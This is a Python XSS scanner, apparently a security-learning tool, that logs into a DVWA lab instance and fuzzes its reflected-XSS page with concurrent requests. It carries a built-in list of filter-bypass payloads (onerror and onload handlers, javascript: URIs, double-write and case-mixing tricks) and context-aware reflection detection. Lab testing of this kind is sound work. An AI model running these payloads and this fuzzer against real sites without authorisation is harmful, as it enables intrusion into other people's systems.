import sys
import os
import requests
import urllib.parse
import time
import json
import urllib3
import re
import html
from typing import Dict, List, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore,  init
from datetime import datetime  # 添加这行导入

# ========== 配置区域 (相对路径版) ==========
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_FILE = os.path.join(BASE_DIR, 'config', 'xss_payload.txt')
REPORT_DIR = os.path.join(BASE_DIR, 'scan_result', 'DvwaXSSScanner')
MAX_WORKERS = 10  # 并发线程数
# ==============================

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

try:
    from DVWAlogin import DvwaLogin
except ImportError as e:
    print(f"{Fore.RED}[ERROR] DVWA登录模块导入失败: {e}")
    sys.exit(1)


class DvwaXSSScanner:
    """XSS漏洞扫描器"""

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = None
        self.base_url = None
        self.payloads = []
        self.bypass_payloads = []  # WAF绕过专用

        self.results = {
            'target_url': None,
            'vulnerabilities': [],
            'scan_time': None,
            'parameters_tested': 0,
            'xss_points_found': 0,
            'payloads_loaded': 0
        }

    def load_xss_payloads(self, filepath: str) -> bool:
        """加载XSS payload + WAF绕过payload"""
        try:
            # 基础payload
            with open(filepath, 'r', encoding='utf-8') as f:
                self.payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]

            # WAF绕过payload（内置）
            self.bypass_payloads = [
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
                "javascript:alert(1)",
                "<script>alert(String.fromCharCode(88,83,83))</script>",  # 编码绕过
                "<scr<script>ipt>alert(1)</scr<script>ipt>",  # 双写绕过
                "%3Cscript%3Ealert(1)%3C%2Fscript%3E",  # URL编码
                "<ScRiPt>alert(1)</ScRiPt>",  # 大小写混淆
                "<img src=x onerror='alert(\"XSS\")'>",  # 引号混淆
            ]

            self.results['payloads_loaded'] = len(self.payloads) + len(self.bypass_payloads)
            print(f"{Fore.GREEN}[✓] 加载 {self.results['payloads_loaded']} 个payload")
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] 加载失败: {e}")
            return False

    def setup_session(self, dvwa_login_instance: DvwaLogin) -> bool:
        """设置会话"""
        try:
            session_info = dvwa_login_instance.get_session_info()
            if not session_info or 'session' not in session_info:
                print(f"{Fore.RED}[✗] 会话信息无效")
                return False

            self.session = session_info['session']
            self.base_url = session_info['base_url']
            print(f"{Fore.GREEN}[✓] 会话设置成功: {self.base_url}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] 设置失败: {e}")
            return False

    def parse_parameters(self, url: str) -> Dict[str, List[str]]:
        """解析URL参数"""
        parsed = urllib.parse.urlparse(url)
        return urllib.parse.parse_qs(parsed.query, keep_blank_values=True) if parsed.query else {}

    def send_request(self, url: str, method: str = 'GET', data: Dict = None, params: Dict = None) -> Tuple[bool, requests.Response]:
        """发送请求（带重试机制）"""
        for attempt in range(3):
            try:
                if method.upper() == 'GET':
                    response = self.session.get(url, params=params, timeout=self.timeout, verify=False)
                else:
                    response = self.session.post(url, data=data, timeout=self.timeout, verify=False)
                return True, response
            except requests.RequestException as e:
                if attempt == 2:
                    print(f"{Fore.YELLOW}[!] 请求失败: {e}")
                    return False, None
                time.sleep(0.5)

    def detect_xss_context(self, response_text: str, payload: str) -> Dict[str, Any]:
        """
        智能上下文检测 - 看payload在哪，不是只看在不在
        返回值: vulnerable, context, confidence
        """
        # 先找payload位置
        pos = response_text.find(payload)
        if pos == -1:
            # 尝试解码后匹配
            decoded = urllib.parse.unquote(payload)
            pos = response_text.find(decoded)
            if pos == -1:
                return {'vulnerable': False}

        # 提取payload周围50字符看上下文
        context_start = max(0, pos - 50)
        context_end = min(len(response_text), pos + len(payload) + 50)
        context = response_text[context_start:context_end]

        # 1. 在HTML标签外（最危险）
        if re.search(rf'>[^<]*{re.escape(payload)}[^>]*<', context):
            return {'vulnerable': True, 'context': 'html_context', 'confidence': 'critical'}

        # 2. 在script标签内
        if re.search(rf'<script[^>]*>[^<]*{re.escape(payload)}', context, re.IGNORECASE):
            return {'vulnerable': True, 'context': 'javascript', 'confidence': 'critical'}

        # 3. 在HTML属性内（可闭合）
        if re.search(rf'=["\'][^"\']*{re.escape(payload)}[^"\']*["\']', context):
            if '"' in payload or "'" in payload or '>' in payload:
                return {'vulnerable': True, 'context': 'attribute', 'confidence': 'high'}

        # 4. 在注释里（没用）
        if f'<!--{payload}-->' in context:
            return {'vulnerable': False, 'reason': 'in_html_comment'}

        # 5. 被编码了（安全）
        if html.escape(payload) in context:
            return {'vulnerable': False, 'reason': 'html_encoded_safe'}

        return {'vulnerable': False}

    def test_reflected_xss(self, target_url: str) -> List[Dict[str, Any]]:
        """测试反射型XSS """
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}[反射型XSS测试]")
        print(f"{Fore.CYAN}{'='*60}")

        vulnerabilities = []
        parsed_params = self.parse_parameters(target_url)
        if not parsed_params:
            print(f"{Fore.YELLOW}[!] 无URL参数")
            return []

        print(f"{Fore.GREEN}[✓] 发现参数: {list(parsed_params.keys())}")

        # 合并payload
        all_payloads = self.payloads + self.bypass_payloads
        total_tasks = len(parsed_params) * len(all_payloads)

        def test_single_payload(param_name, payload):
            """单payload测试函数"""
            test_params = {k: v[0] if v else "" for k, v in parsed_params.items()}
            test_params[param_name] = payload

            success, response = self.send_request(target_url.split('?')[0], params=test_params)
            if not success:
                return None

            # 智能上下文检测
            context_result = self.detect_xss_context(response.text, payload)
            if context_result['vulnerable']:
                return {
                    'parameter': param_name,
                    'payload': payload,
                    'type': 'reflected',
                    'context': context_result['context'],
                    'confidence': context_result['confidence'],
                    'sample': response.text[:150] + '...' if len(response.text) > 150 else response.text
                }
            return None

        # 并发执行
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_test = {
                executor.submit(test_single_payload, param, payload): (param, payload)
                for param in parsed_params
                for payload in all_payloads
            }

            completed = 0
            for future in as_completed(future_to_test):
                completed += 1
                if completed % 50 == 0:
                    print(f"{Fore.YELLOW}[进度] {completed}/{total_tasks} ({completed/total_tasks*100:.1f}%)")

                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    print(f"{Fore.GREEN}[✓] 漏洞: {result['parameter']} | {result['context']} | {result['payload'][:50]}")

        self.results['parameters_tested'] = len(parsed_params)
        self.results['xss_points_found'] += len(vulnerabilities)
        return vulnerabilities

    def scan_dvwa_xss(self) -> Dict[str, Any]:
        """主扫描入口 """
        if not self.session or not self.base_url:
            print(f"{Fore.RED}[✗] 未初始化会话")
            return {}

        target_url = f"{self.base_url}/vulnerabilities/xss_r/?name=test"

        self.results['target_url'] = target_url
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')

        print(f"\n{Fore.YELLOW}[扫描目标: {target_url}]")
        print(f"{Fore.CYAN}类型: REFLECTED")

        vulnerabilities = self.test_reflected_xss(target_url)

        self.results['vulnerabilities'] = vulnerabilities
        return self.generate_report()

    def generate_report(self) -> Dict[str, Any]:
        """生成报告"""
        return {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'parameters_tested': self.results['parameters_tested'],
                'xss_points_found': self.results['xss_points_found'],
                'payloads_loaded': self.results['payloads_loaded'],
                'total_vulnerabilities': len(self.results['vulnerabilities'])
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'recommendations': [
                "实施Context-aware输出编码",
                "部署CSP内容安全策略",
                "使用HttpOnly + Secure Cookie标志",
                "定期扫描+手动验证",
                "开发安全编码规范"
            ]
        }

    def print_report(self, report: Dict[str, Any]):
        """打印报告"""
        summary = report['scan_summary']
        vulns = report['vulnerabilities']

        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"  {Fore.CYAN}DVWA XSS扫描报告 ")
        print(f"{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}目标: {summary['target_url']}")
        print(f"{Fore.GREEN}时间: {summary['scan_time']}")
        print(f"{Fore.GREEN}参数: {summary['parameters_tested']}个")
        print(f"{Fore.GREEN}漏洞: {summary['total_vulnerabilities']}个")
        print(f"{Fore.YELLOW}{'='*70}")

        if not vulns:
            print(f"{Fore.GREEN}\n[✓] 未发现XSS漏洞")
            return

        print(f"{Fore.RED}\n[!] 发现漏洞详情:")
        for i, vuln in enumerate(vulns, 1):
            print(f"\n{Fore.YELLOW}[#{i}] {vuln['parameter']} | {vuln['type']} | {vuln['confidence'].upper()}")
            print(f"{Fore.CYAN}Payload: {vuln['payload'][:60]}...")
            if vuln.get('context'):
                print(f"{Fore.MAGENTA}Context: {vuln['context']}")
            if vuln.get('sample'):
                print(f"{Fore.WHITE}Sample: {vuln['sample'][:100]}")

        print(f"\n{Fore.CYAN}修复建议:")
        for i, rec in enumerate(report['recommendations'], 1):
            print(f"  {i}. {rec}")


def main():
    """主函数"""
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f" XSS漏洞扫描器 ")
    print(f"{Fore.CYAN}{'='*70}")

    # 检查文件
    if not os.path.exists(PAYLOAD_FILE):
        print(f"{Fore.RED}[✗] Payload文件不存在: {PAYLOAD_FILE}")
        return

    # DVWA地址
    dvwa_url = input(f"\n{Fore.YELLOW}[?] 请输入DVWA URL (如: http://192.168.1.100:8085):  ").strip()
    if not dvwa_url:
        print(f"{Fore.RED}[✗] URL不能为空")
        return

    # 登录
    print(f"\n{Fore.CYAN}[步骤 1/2] 登录DVWA...")
    dvwa_login = DvwaLogin()
    if not dvwa_login.login(dvwa_url):
        print(f"{Fore.RED}[✗] 登录失败")
        return
    dvwa_login.test_connection()

    # 初始化扫描器
    print(f"{Fore.CYAN}[步骤 2/2] 初始化并扫描...")
    scanner = DvwaXSSScanner(timeout=15)
    if not scanner.load_xss_payloads(PAYLOAD_FILE):
        return

    if not scanner.setup_session(dvwa_login):
        return

    # 扫描
    report = scanner.scan_dvwa_xss()

    # 报告
    scanner.print_report(report)

    # 保存报告到指定目录
    try:
        # 确保报告目录存在
        os.makedirs(REPORT_DIR, exist_ok=True)

        # 修改：生成带时间戳的文件名
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"dvwa_xss_report_{timestamp}.json"
        filepath = os.path.join(REPORT_DIR, filename)

        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        print(f"\n{Fore.GREEN}[✓] 报告已保存: {filepath}")
    except Exception as e:
        print(f"{Fore.RED}[✗] 报告保存失败: {e}")


if __name__ == "__main__":
    main()